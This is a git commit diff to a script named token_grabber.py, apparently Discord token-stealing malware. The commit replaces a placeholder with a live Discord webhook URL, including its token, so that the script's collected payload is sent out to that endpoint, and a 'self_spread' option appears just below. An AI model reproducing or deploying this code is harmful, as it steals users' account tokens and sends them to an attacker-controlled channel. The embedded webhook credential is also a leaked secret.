bab67ed979225c95a7642b4d085f4941b2a08990
FelixRogg <felix.roggenkamp@protonmail.com>
2021-12-13 12:24:42 +0100

    Update

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/919911824412008458/uHP5vlG-cAL4Sq4ovXizn7cf47bEp4VGW_NDhIj5vMNOtH4ij8EYZIiVX_Yy2WQ9kWk7", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
